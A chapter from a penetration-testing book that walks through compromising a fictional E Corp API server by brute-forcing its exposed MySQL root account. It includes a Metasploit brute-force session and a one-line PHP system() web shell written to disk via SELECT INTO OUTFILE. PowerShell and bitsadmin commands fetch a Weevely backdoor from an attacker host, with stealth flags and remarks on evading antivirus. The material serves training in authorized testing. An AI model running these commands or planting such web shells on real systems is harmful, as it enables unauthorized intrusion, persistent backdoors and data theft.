<html><head></head><body><div class="chapter" title="Chapter&#xA0;3.&#xA0;Low-Hanging Fruit"><div class="titlepage"><div><div><h1 class="title"><a id="ch03"/>Chapter 3. Low-Hanging Fruit</h1></div></div></div><p>It is often the case that clients will approach security professionals with a request to perform an application penetration test. In many engagements, there is not a lot of information given to the tester, if any at all, prompting a black-box approach to testing. This can make testing more difficult, especially when open-source intelligence isn't of much help or the interface is not intuitive, or user friendly, which is sometimes the case with an API.</p><p>In the scenario presented in this chapter, we are faced with this exact problem, which is commonly encountered in the wild. Instead of deep diving into the inner workings of the API and attempting to reverse engineer its functionality without much prior knowledge, we can start by looking for low-hanging fruit. We hope that if we take the road less travelled by the security team, we can eventually reach the open back window and bypass the four-foot thick steel door protecting the entrance.</p><p>In this chapter, we will look at the following:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Assessing the application server's security posture for alternate routes to compromise</li><li class="listitem" style="list-style-type: disc">Brute-force attacks on services</li><li class="listitem" style="list-style-type: disc">Leveraging vulnerabilities in adjacent services to compromise the target</li></ul></div><div class="section" title="Network assessment"><div class="titlepage"><div><div><h1 class="title"><a id="ch03lvl1sec24"/>Network assessment</h1></div></div></div><p>We've seen in previous <a id="id166" class="indexterm"/>chapters that Metasploit's workspace feature can be very useful. In the following engagement, we will make use of it as well. First, we have to launch the console from the terminal using the <code class="literal">msfconsole</code> command. Once Metasploit has finished loading, it will drop us into the familiar <code class="literal">msf &gt;</code> prompt.</p><div class="informalexample"><pre class="programlisting">root@kali:~#<span class="strong"><strong> msfconsole</strong></span>
[*] StarTing the Metasploit Framework console...
msf &gt;</pre></div><p>As with all engagements involving Metasploit, we start by creating a workspace specifically for the scope:</p><div class="informalexample"><pre class="programlisting">msf &gt;<span class="strong"><strong> workspace -a ecorp</strong></span>
[*] Added workspace: ecorp</pre></div><p>For this scenario, our target is a black-box API application provided by E Corp. The target host will be <code class="literal">api.ecorp.local</code>.</p><p>Before we hammer away at the web interface and try to exploit some obscure vulnerability, let's take a step back and see what other services are exposed on the API's server. The hope here is that while the API itself may have been closely scrutinized by developers, who may have taken security seriously during the development life cycle, mistakes may have been made when deploying the server itself. There are many aspects of system hardening that simply cannot be controlled within the source code repository. This is especially true when the server housing the target application is a shared resource. This increases the likelihood that the system security policy will loosen up over time as different teams with different requirements interact with it. There could be some development instance with less stringent controls running on a non-standard port, or a forgotten and vulnerable application that can give us (as an attacker) the required access, and we can easily compromise the target.</p><p>As always, Nmap is our network recon tool of choice and coupled with Metasploit's workspace, it becomes even more powerful. The Metasploit console wrapper command for Nmap is the <code class="literal">db_nmap</code> command. The Nmap switches that we will use for discovering open ports, and querying services for more information, are detailed in the following text.</p><p>The <code class="literal">-sV</code> will instruct Nmap to perform a version scan of any identified services, and the <code class="literal">-A</code> will provide us with some host fingerprinting, attempting to detect the operating system. The <code class="literal">-T4</code> option is used to tell Nmap to be more aggressive when scanning the network. This improves scanning speed at the risk of being detected by intrusion detection systems. A lower number, such as <code class="literal">-T1</code>, will make scanning a bit more paranoid, and while it may take longer to complete, it could let us fly under the radar for a bit longer. The <code class="literal">-Pn</code> switch will prevent Nmap from performing a ping of the target. Pinging our target is not really required unless we scan a wide range of addresses and we're only looking for hosts that are online. Finally, <code class="literal">-p1-</code> (lowercase) is a short form for <code class="literal">-p1-65535</code>, instructing Nmap to scan all possible ports on the target. The unnamed parameter is our target, <code class="literal">api.ecorp.local</code>:</p><div class="informalexample"><pre class="programlisting">msf &gt;<span class="strong"><strong> db_nmap -sV -A -T4 -Pn -p1- api.ecorp.local</strong></span>
[*] Nmap: Starting Nmap 7.40 ( https://nmap.org )
[...]
[*] Nmap: Nmap done:<span class="strong"><strong> 1 IP address (1 host up) </strong></span>scanned in 206.07 seconds
msf &gt;</pre></div><p>Since we've wrapped the Nmap scan using the Metasploit <code class="literal">db_nmap</code> command, the results are automatically parsed and written to our workspace's database. Once the scan is complete, we can review the entries in the database by issuing the <code class="literal">services</code> command:</p><div class="informalexample"><pre class="programlisting">msf &gt; services
Services
========
host        port   proto  name       state  info
----        ----   -----  ----       -----  ----
<span class="strong"><strong>10.0.5.198  80     tcp    http       open   Apache httpd 2.4.26 (Win32) OpenSSL/1.0.2l PHP/5.6.31</strong></span>
<span class="strong"><strong>10.0.5.198  3306   tcp    mysql      open   MariaDB unauthorized</strong></span>
</pre></div><p>It appears that the MySQL instance is <a id="id167" class="indexterm"/>reachable, so gaining access to this would be very valuable. Nmap detected this as a <span class="strong"><strong>MariaDB</strong></span> service, which is the community-developed fork <a id="id168" class="indexterm"/>for the MySQL software. If we're very lucky, this instance is outdated, with some easily exploitable vulnerability that will give us instant access. To figure this out, we can use the database <a id="id169" class="indexterm"/>software version number and run it by a list of public <span class="strong"><strong>Common Vulnerabilities and Exposures</strong></span> (<span class="strong"><strong>CVEs</strong></span>), and hopefully find some exploitable code in the wild for our service.</p><p>Instead of going at the application head on, over port <code class="literal">80</code>, we hope to attack it via the exposed MySQL (MariaDB) services, as this attack path figure shows:</p><div class="mediaobject"><img src="graphics/B09238_03_01.jpg" alt="Network assessment"/><div class="caption"><p>Figure 3.1: An alternate path to compromise</p></div></div><div class="section" title="Looking for a way in"><div class="titlepage"><div><div><h2 class="title"><a id="ch03lvl2sec21"/>Looking for a way in</h2></div></div></div><p>Since the Nmap scan did not return a specific version, we can quickly issue a detailed version probe for the <a id="id170" class="indexterm"/>MySQL service, using a couple of Metasploit commands.</p><p>First, we load the aptly named <code class="literal">mysql_version</code> auxiliary scanner module. The <code class="literal">use</code> command, followed by the path to the module <code class="literal">auxiliary/scanner/mysql/mysql_version</code>, will load the module in the current session. We can view more information on the <code class="literal">mysql_version</code> module by issuing the <code class="literal">show info</code> command, as shown in the following screenshot:</p><div class="mediaobject"><img src="graphics/B09238_03_02.jpg" alt="Looking for a way in"/><div class="caption"><p>Figure 3.2: mysql_version module information</p></div></div><p>The <code class="literal">Basic options:</code> will list the variables we will need to update in order for the module to execute properly. The <code class="literal">RHOSTS</code>, <code class="literal">RPORT</code>, and <code class="literal">THREADS</code> parameters are required for this particular scanner. <code class="literal">RHOSTS</code>, or remote hosts, and <code class="literal">RPORT</code>, or remote port, should be self-explanatory. The <code class="literal">THREADS</code> option can be increased to a higher number to increase scan speed, but since we are only targeting one remote host, <code class="literal">api.ecorp.local</code>, we don't need more than one scanning thread.</p><p>With the module loaded, we can set the required <code class="literal">RHOSTS</code> variable to the appropriate target. Since the target was <a id="id171" class="indexterm"/>already scanned by <code class="literal">db_nmap</code>, and the results are in the <code class="literal">ecorp</code> workspace, we can use the <code class="literal">services</code> command to set the <code class="literal">RHOSTS</code> variable automatically to all MySQL servers found, as follows:</p><div class="informalexample"><pre class="programlisting">msf auxiliary(mysql_version) &gt;<span class="strong"><strong> services -s mysql </strong></span>
<span class="strong"><strong>-R</strong></span>
Services
========
host        port  proto  name   state  info
----        ----  -----  ----   -----  ----
10.0.5.198  3306  tcp    mysql  open   MariaDB unauthorized
<span class="strong"><strong>RHOSTS =&gt; 10.0.5.198</strong></span>
msf auxiliary(mysql_version) &gt;</pre></div><p>The <code class="literal">services</code> command accepts a few switches to better filter and action the results. The <code class="literal">-R</code> option in the services command set the current module's <code class="literal">RHOSTS</code> variable to the values returned by the query. In this scenario, you could have just as easily typed in the host manually, but with broader sweeps, this particular switch will be very handy.</p><p>There are other ways to query the <a id="id172" class="indexterm"/>services in the workspace. For example, in the preceding command-line input, we used the <code class="literal">-s</code> option, which filters all hosts running MySQL as an identified service.</p><p>If we know that we will be attacking the same host with other Metasploit modules, it's a good idea to set the global <code class="literal">RHOSTS</code> variable to the same value. This will ensure that the <code class="literal">RHOSTS</code> value is automatically populated when switching modules. We can accomplish this by using the <code class="literal">setg</code> command as follows:</p><div class="informalexample"><pre class="programlisting">msf auxiliary(mysql_version) &gt;<span class="strong"><strong> setg RHOSTS 10.0.5.198</strong></span>
RHOSTS =&gt; 10.0.5.198
msf auxiliary(mysql_version) &gt;</pre></div><p>All that's left to do now is to run the <code class="literal">mysql_version</code> module and hopefully get back some useful information, as shown in the following screenshot:</p><div class="mediaobject"><img src="graphics/B09238_03_03.jpg" alt="Looking for a way in"/><div class="caption"><p>Figure 3.3: mysql_version running on the target RHOSTS</p></div></div><p>It appears that the module <a id="id173" class="indexterm"/>was able to identify the MySQL server version successfully. This will prove useful when looking for known vulnerabilities.</p><p>If we issue another <code class="literal">services</code> query, you will notice that the info field for the <code class="literal">mysql</code> service has changed to the results of the <code class="literal">mysql_version</code> scan, as follows:</p><div class="informalexample"><pre class="programlisting">msf auxiliary(mysql_version) &gt;<span class="strong"><strong> services -s mysql</strong></span>
Services
========
host        port  proto  name   state  info
----        ----  -----  ----   -----  ----
10.0.5.198  3306  tcp    mysql  open   5.5.5-10.1.25-MariaDB
msf auxiliary(mysql_version) &gt;</pre></div><p>Where our Nmap scan fell short in identifying the version number, Metasploit succeeded and automatically changed the database to reflect this. After reviewing the public CVEs for MySQL, however, it doesn't appear that this instance has any unauthenticated vulnerabilities.</p><p>Back in the Kali Linux terminal, we <a id="id174" class="indexterm"/>can use the <code class="literal">mysql</code> client command to attempt to authenticate as <code class="literal">root</code> (<code class="literal">-u</code>) to the <code class="literal">api.ecorp.local</code> host (<code class="literal">-h</code>):</p><div class="informalexample"><pre class="programlisting">root@kali:~#<span class="strong"><strong> mysql -uroot -hapi.ecorp.local</strong></span>
ERROR 1045 (28000): Access denied for user 'root'@'attacker.c2' (using password: NO)
root@kali:~#</pre></div><p>Note the lack of space between the <code class="literal">-u</code> and <code class="literal">-h</code> switches and their respective values. A quick check for an empty <code class="literal">root</code> password fails, but it proves that the MySQL server is accepting connections from remote addresses.</p></div><div class="section" title="Credential guessing"><div class="titlepage"><div><div><h2 class="title"><a id="ch03lvl2sec22"/>Credential guessing</h2></div></div></div><p>Since we were unable to <a id="id175" class="indexterm"/>uncover a working remote exploit for the MySQL instance, the next step is to attempt a credentialed brute-force attack against the default MySQL <code class="literal">root</code> user. We will use one of our curated commonly used password dictionaries and hope this instance was not properly secured during deployment.</p><p>With Metasploit's help, we can start a MySQL login password guessing attack fairly easily. We will use the <code class="literal">mysql_login</code> auxiliary scanner module, as seen in the following screenshot. This module has some additional available options for tuning:</p><div class="mediaobject"><img src="graphics/B09238_03_04.jpg" alt="Credential guessing"/><div class="caption"><p>Figure 3.4: The mysql_login auxiliary scanner module</p></div></div><p>Before continuing, we will set the following values to make the scan a bit more efficient and reduce some noise:</p><div class="informalexample"><pre class="programlisting">msf auxiliary(mysql_login) &gt;<span class="strong"><strong> set THREADS 10</strong></span>
THREADS =&gt; 10
msf auxiliary(mysql_login) &gt;<span class="strong"><strong> set VERBOSE false</strong></span>
VERBOSE =&gt; false
msf auxiliary(mysql_login) &gt;<span class="strong"><strong> set STOP_ON_SUCCESS true</strong></span>
STOP_ON_SUCCESS =&gt; true
msf auxiliary(mysql_login) &gt;</pre></div><p>Increasing the <code class="literal">THREADS</code> count will help you to get through the scan more quickly, although it can be more noticeable. More threads means more connections to the service. If this particular host is not very resilient, we may crash it, thereby alerting the defenders. If our goal is to be <a id="id176" class="indexterm"/>quieter, we can use only one thread but the scan will take much longer. The <code class="literal">VERBOSE</code> variable should be set to <code class="literal">false</code>, as you will be testing lots of passwords and the console output can get messy. An added bonus to non-verbose output is that it improves the scan time significantly, since Metasploit does not have to output something to the screen after every attempt. Finally, with <code class="literal">STOP_ON_SUCCESS</code> set to <code class="literal">true</code>, we will stop the attack if we have a successful login.</p><p>The target <code class="literal">USERNAME</code> will be <code class="literal">root</code>, as it is common for MySQL installations have this user enabled by default:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>msf auxiliary(mysql_login) &gt; set USERNAME root</strong></span>
<span class="strong"><strong>USERNAME =&gt; root</strong></span>
</pre></div><p>For the wordlist, <code class="literal">PASS_FILE</code> will be set to the <code class="literal">SecLists</code> <code class="literal">10-million-password-list-top-500.txt</code> collection as follows. This is 500 of the most popular passwords from a larger 10 million password list:</p><div class="informalexample"><pre class="programlisting">msf auxiliary(mysql_login) &gt; set PASS_FILE <span class="strong"><strong>~/tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt</strong></span>
PASS_FILE =&gt; ~/tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
msf auxiliary(mysql_login) &gt;</pre></div><p>This is a good place to start. There are other top variations of the 10 million password list file, and if this one fails to produce a valid login, we can try the top 1,000, 10,000, or other wordlists.</p><p>Much like every other module in Metasploit, the <code class="literal">run</code> command will begin execution:</p><div class="informalexample"><pre class="programlisting">msf auxiliary(mysql_login) &gt; <span class="strong"><strong>run</strong></span>
</pre></div><p>After a few minutes, we receive some good news:</p><div class="informalexample"><pre class="programlisting">[+] 10.0.5.198:3306       - MYSQL - Success:<span class="strong"><strong> 'root:789456123'</strong></span>
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(mysql_login) &gt;</pre></div><p>It appears that we have found a valid login for the MySQL instance running on the same machine as our target application. This may or may not be the database in use by the API itself. We will take a <a id="id177" class="indexterm"/>closer look and see if we can find a way to spawn a shell, and fully compromise the E Corp API server, and by extension our target as well.</p><p>We can connect directly from our Kali Linux instance using the <code class="literal">mysql</code> command once more. The <code class="literal">-u</code> switch will specify the username and the <code class="literal">-p</code> switch will let us pass the newly discovered password. There's no space between the switches and their values. If we omit a value for <code class="literal">-p</code>, the client will prompt us for a password.</p><p>The following screenshot shows a successful connection to the database service and the listing of the available databases using the <code class="literal">show databases;</code> SQL query:</p><div class="mediaobject"><img src="graphics/B09238_03_05.jpg" alt="Credential guessing"/><div class="caption"><p>Figure 3.5: Successfully authenticated connection to the target database</p></div></div><p>Once connected, we've queried for the available databases, but there doesn't appear to be anything related to the API on this server. It's possible that the API is configured to use a different SQL database, and we've stumbled upon a development instance without much interesting data.</p><p>Given that we are the database administrator, <code class="literal">root</code>, we should be able to do lots of interesting things, including writing <a id="id178" class="indexterm"/>arbitrary data to the disk. If we can do this, it means that we can potentially achieve remote code execution.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="tip09"/>Tip</h3><p>There is a Metasploit module (surprise, surprise) that can deliver executables and initiate a reverse shell using known credentials. For Windows machines, <code class="literal">exploit/windows/mysql/mysql_payload</code> can upload a Meterpreter shell and execute it, although there are some drawbacks. A standard Metasploit payload will likely be picked up by <span class="strong"><strong>antivirus</strong></span> (<span class="strong"><strong>AV</strong></span>) software and alert the defenders to your activities. Bypassing AVs is possible with a <span class="strong"><strong>fully undetectable</strong></span> (<span class="strong"><strong>FUD</strong></span>) Metasploit payload, but for the scenario in this chapter, we will go with a simpler, less risky option.</p></div></div><p>While MySQL is able to write files to disk using SQL query statements, it is actually a bit more complicated to execute binaries. We can't easily write binary data to disk, but we can write application source code. The simplest way to achieve code execution is to write some PHP code inside the application directory that will let us execute shell commands through the application URL. With PHP's help, the web shell will accept commands through an HTTP <code class="literal">GET</code> request and pass them to the system shell.</p><p>Now let's find out where we are on the disk, so that we can write the payload to the appropriate web application directory. The <code class="literal">SHOW VARIABLES</code> SQL query lets us see configuration data and the <code class="literal">WHERE</code> clause limits the output to directory information only, as shown here:</p><div class="informalexample"><pre class="programlisting">MariaDB [(none)]&gt; show variables where variable_name like<span class="strong"><strong> '%dir';</strong></span>
+---------------------------+--------------------------------+
| Variable_name             | Value                          |
+---------------------------+--------------------------------+
| aria_sync_log_dir         | NEWFILE                        |
| basedir                   | C:/xampp/mysql                 |
| character_sets_dir        | C:\xampp\mysql\share\charsets\ |
| datadir                   | C:\xampp\mysql\data\           |
| innodb_data_home_dir      | C:\xampp\mysql\data            |
| innodb_log_arch_dir       | C:\xampp\mysql\data            |
| innodb_log_group_home_dir | C:\xampp\mysql\data            |
| innodb_tmpdir             |                                |
| lc_messages_dir           |                                |
| plugin_dir                | C:\xampp\mysql\lib\plugin\     |
| slave_load_tmpdir         | C:\xampp\tmp                   |
| tmpdir                    | C:/xampp/tmp                   |
+---------------------------+--------------------------------+
12 rows in set (0.00 sec)
MariaDB [(none)]&gt;</pre></div><p>This looks like a XAMPP installation and based on open-source documentation, the main website code should be located in <code class="literal">c:\xampp\htdocs\</code>. You can confirm this by a quick <code class="literal">curl</code> test. A typical XAMPP installation comes with a subdirectory in the <code class="literal">htdocs</code> folder called <code class="literal">xampp</code>. Among other things, it <a id="id179" class="indexterm"/>houses a <code class="literal">.version</code> file, which contains what you would expect, the XAMPP version:</p><div class="informalexample"><pre class="programlisting">root@kali:~#<span class="strong"><strong> curl http://api.ecorp.local/xampp/.version</strong></span>
5.6.31
root@kali:~#</pre></div><p>Back to the MySQL command-line interface, and we can try to write to that directory using MySQL's <code class="literal">SELECT INTO OUTFILE</code> query. If we can put a PHP file somewhere inside <code class="literal">htdocs</code>, we should be able to call it from a web browser or <code class="literal">curl</code>, and we will have code execution.</p><p>The <code class="literal">SELECT</code> statement template we will use for this is as follows:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>select "[shell code]" into outfile "[/path/to/file.php]";</strong></span>
</pre></div><p>Let's plug in some test values and see if we can write to the target directory, and more importantly, if the application web server will process our PHP code correctly:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>MariaDB [(none)]&gt; select </strong></span>"&lt;?php phpinfo();/*ECorpAppTest11251*/ ?&gt;" into outfile "c:/xampp/htdocs/xampp/phpinfo.php";
<span class="strong"><strong>Query OK, 1 row affected (0.01 sec)</strong></span>
<span class="strong"><strong>MariaDB [(none)]&gt;</strong></span>
</pre></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note10"/>Note</h3><p>The <code class="literal">ECorpAppTest11251</code> flag is added as a comment, in case we are unable to clean up this shell after the test is complete, and have to report it to the client's blue team. It can also help the blue team to identify files that may have been missed as part of the incident response exercise. This is not always required, but it is good practice, especially with high-risk artifacts.</p></div></div><p>This is good: the query was <a id="id180" class="indexterm"/>successful. We can check to see if the PHP interpreter works in this directory, and if the file is successfully executed, by calling it from the browser, as shown in the following screenshot:</p><div class="mediaobject"><img src="graphics/B09238_03_06.jpg" alt="Credential guessing"/><div class="caption"><p>Figure 3.6: The PHP code executing successfully</p></div></div><p>At this point, we need to get shell access to the server, so that we can execute arbitrary commands and not just output PHP configuration data. Modifying the previous <code class="literal">SELECT INTO OUTFILE</code> payload will <a id="id181" class="indexterm"/>produce a rudimentary PHP shell. PHP has a built-in function that conveniently executes arbitrary shell commands. This is true for all server-side web programming languages: Python, Perl, ASP, Ruby, and so on.</p><p>If we pass data from the <code class="literal">GET</code> request into the PHP built-in <code class="literal">system()</code> function, we can execute arbitrary commands on the server itself.</p><p>The following shows our web shell source code:</p><div class="mediaobject"><img src="graphics/B09238_03_07.jpg" alt="Credential guessing"/><div class="caption"><p>Figure 3.7: Web shell source code</p></div></div><p>The code is fairly straightforward. The <code class="literal">if</code> statement will check the MD5 hash value of the incoming <code class="literal">password</code> parameter matches <code class="literal">4fe7aa8a3013d07e292e5218c3db4944</code>. If there's a match, the command string in the <code class="literal">cmd</code> <code class="literal">GET</code> parameter will be passed to the PHP <code class="literal">system()</code> function, which will execute it as a system command, giving us shell access.</p><p>The MD5 value we're looking for is the hash value of <code class="literal">ECorpAppTest11251</code>, as confirmed by the <code class="literal">md5sum</code> Linux command:</p><div class="informalexample"><pre class="programlisting">root@sol:~# echo -n ECorpAppTest11251 | md5sum
<span class="strong"><strong>4fe7aa8a3013d07e292e5218c3db4944  </strong></span>-
root@sol:~#</pre></div><p>To easily write the shell code to the disk using MySQL's <code class="literal">SELECT INTO OUTFILE</code> statement, we can compress it <a id="id182" class="indexterm"/>down to one line. Thankfully, PHP is not very concerned with carriage returns, as long as the code is properly segregated by semicolons and curly braces. We can compress our web shell into the following line:</p><div class="informalexample"><pre class="programlisting">&lt;?php if (md5($_GET['password']) == <span class="strong"><strong>'4fe7aa8a3013d07e292e5218c3db4944') </strong></span>{ system($_GET['cmd']); } ?&gt;</pre></div><p>If we plug it into our <code class="literal">SELECT INTO OUTFILE</code> template, we should be able to write it to disk in the <code class="literal">xampp</code> subdirectory, which is accessible from the web:</p><div class="informalexample"><pre class="programlisting">MariaDB [(none)]&gt; select<span class="strong"><strong> "&lt;?php if (md5($_GET['password']) == '4fe7aa8a3013d07e292e5218c3db4944') { system($_GET['cmd']); } ?&gt;" into outfile "c:/xampp/htdocs/xampp/xampp.php";</strong></span>
Query OK, 1 row affected (0.01 sec)
<span class="strong"><strong>MariaDB [(none)]&gt;</strong></span>
</pre></div><p>We can see the shell in action by executing the <code class="literal">tasklist</code> system command and passing the <code class="literal">ECorpAppTest11251</code> value as the password, as shown in the following screenshot:</p><div class="mediaobject"><img src="graphics/B09238_03_08.jpg" alt="Credential guessing"/><div class="caption"><p>Figure 3.8: A process listing on the application server</p></div></div><p>That was easy. We now have arbitrary code execution on the application server. We can retrieve the target source <a id="id183" class="indexterm"/>code, find the database, dump passwords, backdoor the application, and much, much more.</p></div></div></div>
<div class="section" title="A better way to shell"><div class="titlepage"><div><div><h1 class="title"><a id="ch03lvl1sec25"/>A better way to shell</h1></div></div></div><p>While we have achieved the goal of executing code on the server and have effectively compromised the application (and more!), you may have an incentive to dig a bit deeper. Moreover, the web <a id="id184" class="indexterm"/>shell created so far is fairly dumb and it is difficult to execute commands in succession. If this test lasts for several days, or even weeks, it could be a burden. It is a bit clunky and difficult to work with as well. You may need to transfer files, upgrade to an interactive shell, navigate the filesystem, and so forth. For this and for many other reasons, you should upgrade to a more functional feature-full shell. This is where <span class="strong"><strong>Weevely</strong></span> comes in.</p><p>Weevely is a weaponized web shell installed on Kali Linux by default. It is very easy to use. It generates an obfuscated, password-protected PHP shell that can replace our earlier <code class="literal">system()</code> shell example. Weevely features some useful functionality that goes above and beyond the traditional system pass-through shell, including the following:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">A familiar terminal interface</li><li class="listitem" style="list-style-type: disc">Network pivots</li><li class="listitem" style="list-style-type: disc">File upload and download</li><li class="listitem" style="list-style-type: disc">Reverse and direct TCP shell</li><li class="listitem" style="list-style-type: disc">Meterpreter support</li></ul></div><p>First, we need to generate a new shell by issuing the <code class="literal">weevely generate</code> command. The syntax is as follows:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@kali:/var/www/html# weevely generate &lt;password&gt; &lt;/path/to/shell.php&gt;</strong></span>
</pre></div><p>Weevely will generate a password-protected, obfuscated PHP web shell in the specified path on our Kali machine:</p><div class="informalexample"><pre class="programlisting">root@kali:/var/www/html#<span class="strong"><strong> weevely generate ECorpAppTest11251</strong></span>
<span class="strong"><strong> /var/www/html/shell.php</strong></span>
Generated backdoor with password 'ECorpAppTest11251' in '/var/www/html/shell.php' of 742 byte size.
root@kali:/var/www/html#</pre></div><p>To serve up the newly-generated web shell quickly, we can spawn a temporary web server on our Kali Linux instance <a id="id185" class="indexterm"/>using a one-line command. Python comes bundled with a <code class="literal">SimpleHTTPServer</code> module that can be called from the terminal to serve files over HTTP. There's no need to mess around with the Apache or NGINX settings. By default, the <code class="literal">SimpleHTTPServer</code> module serves the current directory contents to the web.</p><p>In the same directory as the Weevely-generated file <code class="literal">shell.php</code> (<code class="literal">/var/www/html</code>), we can execute python with the <code class="literal">-m</code> switch to load the <code class="literal">SimpleHTTPServer</code> module. The last parameter is the port on which the web server will listen, in this case port <code class="literal">80</code>:</p><div class="informalexample"><pre class="programlisting">root@kali:/var/www/html#<span class="strong"><strong> python -m SimpleHTTPServer 80</strong></span>
Serving HTTP on 0.0.0.0 port 80 ...</pre></div><p>The hard part is over. Now we just have to get <code class="literal">shell.php</code> onto the target server using the existing shell <code class="literal">xampp.php</code>. There are a couple of ways to do this. On Linux servers, <code class="literal">wget</code> is almost always available and simple to use. For Windows, you can leverage either the built-in <code class="literal">bitsadmin.exe</code> or a sexier <code class="literal">powershell.exe</code> one-liner.</p><p>We can leverage <code class="literal">curl</code> and the following template to execute PowerShell commands on the remote host and effectively download a more advanced Weevely shell. You just have to plugin the appropriate values:</p><div class="informalexample"><pre class="programlisting">curl -G "[current shell url]" --data-urlencode <span class="strong"><strong>"cmd=[command to execute]" &amp;password=ECorpAppTest11251</strong></span>
</pre></div><p>The command to execute, in this case, will be the following:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>powershell -w hidden -noni -nop -c (new-object net.webclient).DownloadFile('http://attacker.c2/shell.php','c:\xampp\htdocs\xampp\test.php')</strong></span>
</pre></div><p>In order to execute the PowerShell file downloader quietly and successfully, a few switches are required. The <code class="literal">-w</code> switch sets the window style to <code class="literal">hidden</code>. This prevents any unwanted pop-ups from appearing during <a id="id186" class="indexterm"/>execution. The <code class="literal">-nop</code> and <code class="literal">-noni</code> switches will disable profile loading and user interactivity respectively, providing a bit more stealth while executing the downloader.</p><p>The <code class="literal">-c</code> switch takes an arbitrary PowerShell script block to execute. For our purposes, we will create a new <code class="literal">Net.Webclient</code> object and call its <code class="literal">DownloadFile</code> method with the source and destination as the parameters.</p><p>The PowerShell one-liner example will grab the Weevely shell contents from the <code class="literal">SimpleHTTPServer</code> and drop them into the appropriate <code class="literal">htdocs</code> directory on the application server:</p><div class="informalexample"><pre class="programlisting">root@kali:/var/www/html# curl -G http://api.ecorp.local/xampp/xampp.php --data-urlencode <span class="strong"><strong>"password=ECorpAppTest11251&amp; cmd=powershell -w hidden -noni -nop -c (new-object net.webclient).DownloadFile('http://attacker.c2/test.php','c:\xampp\htdocs\xampp\test.php')"</strong></span>
root@kali:/var/www/html#</pre></div><p>Curl has a <code class="literal">--data-urlencode</code> option, which will, you guessed it, URL encode our command so that it passes through HTTP without causing any problems. The <code class="literal">-G</code> switch ensures that the encoded data is passed via a <code class="literal">GET</code> request.</p><p>Due to the fact that the PowerShell command is spawned in a separate process, the simple PHP shell <code class="literal">xampp.php</code> will not be able to return any success or failure messages. We can verify success by attempting to connect to the shell using the Weevely client.</p><p>Although it would be unusual nowadays, it is possible that PowerShell is disabled or unavailable on the target Windows system. In this case, using <code class="literal">bitsadmin.exe</code> to download payloads works just fine. Plugging in the right values, we can grab our Weevely shell and put it in the <code class="literal">htdocs</code> folder.</p><p>The <code class="literal">bitsadmin</code> command template we will use is as follows:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>bitsadmin /transfer myjob /download /priority high [current shell url] [save location]</strong></span>
</pre></div><p>Just as with the PowerShell downloader, you expand the variables in your command and plug them into the <code class="literal">curl</code> template as follows:</p><div class="informalexample"><pre class="programlisting">root@kali:/var/www/html# curl -G http://api.ecorp.local/xampp/xampp.php --data-urlencode <span class="strong"><strong>"password=ECorpAppTest11251&amp;cmd=bitsadmin /transfer myjob /download /priority high http://attacker.c2/shell.php c:\\xampp\\htdocs\\xampp\\test.php"</strong></span>
BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.
BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
Transfer complete.
root@kali:/var/www/html#</pre></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note11"/>Note</h3><p>As the <code class="literal">bitsadmin</code> output clearly states, the binary is deprecated. While it is still available in all Windows versions to date, this may not be the case going forward. However, enterprises are somewhat slow to adopt new versions of Windows, so you can probably rely on this tool for several years to come.</p></div></div><p>The Weevely client should now be <a id="id187" class="indexterm"/>able to connect to the <code class="literal">test.php</code> shell on the remote host. The syntax to do this is self-explanatory:</p><div class="informalexample"><pre class="programlisting">root@kali:/var/www/html#<span class="strong"><strong> weevely http://api.ecorp.local/xampp/test.php ECorpAppTest11251</strong></span>
[+] weevely 3.2.0
[+] Target:     ECORP-PRD-API01:C:\xampp\htdocs\xampp
[+] Session:    /root/.weevely/sessions/api.ecorp.local/test_0.session
[+] Shell:      System shell
[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.
weevely&gt;
</pre></div><p>We can issue commands in the Weevely shell that will be passed directly to the compromised host:
</p><div class="informalexample"><pre class="programlisting">weevely&gt;<span class="strong"><strong> whoami</strong></span>
ECORP-PRD-API01\Administrator
ECORP-PRD-API01:C:\xampp\htdocs\xampp $</pre></div><p>
</p><p>The first step after getting the Weevely shell would be to remove the system passthrough web shell <code class="literal">xampp.php</code> artifact, created earlier as follows:</p><div class="informalexample"><pre class="programlisting">ECORP-PRD-API01:C:\xampp\htdocs\xampp $<span class="strong"><strong> del xampp.php</strong></span>
</pre></div><p>At this point, we are free to move around the server and gather any information that could be used in later stages of an attack. We have full control of the server, and can run even better reverse shells, such as Meterpreter, if needed.</p><p>Even if the compromised server is <a id="id188" class="indexterm"/>segregated from the rest of the network, we still have access to the application code. We can backdoor it in order to gather network credentials from authenticated users and subsequently attack the corporate network. It really depends on the scope of the engagement.</p></div>
<div class="section" title="Cleaning up"><div class="titlepage"><div><div><h1 class="title"><a id="ch03lvl1sec26"/>Cleaning up</h1></div></div></div><p>As noted, once an engagement is complete, we have to make sure that we clean up any artifacts that may leave the <a id="id189" class="indexterm"/>client exposed. During this attack, we created three files that could be used to attack the client. Although it is unlikely that anyone would be able to use our Weevely shell, it is wise to remove anything left behind. The <code class="literal">phpinfo.php</code> test file that we've created should also be deleted. While it doesn't provide any kind of remote access, it does display information that could be used in an attack.</p><p>In the same way that we queried the MySQL variables to find out where the application resides on disk, an attacker could use the <code class="literal">phpinfo()</code> output to improve the success of a local file inclusion attack, as follows:</p><div class="informalexample"><pre class="programlisting">ECORP-PRD-API01:C:\xampp\htdocs\xampp $<span class="strong"><strong> del test.php phpinfo.php</strong></span>
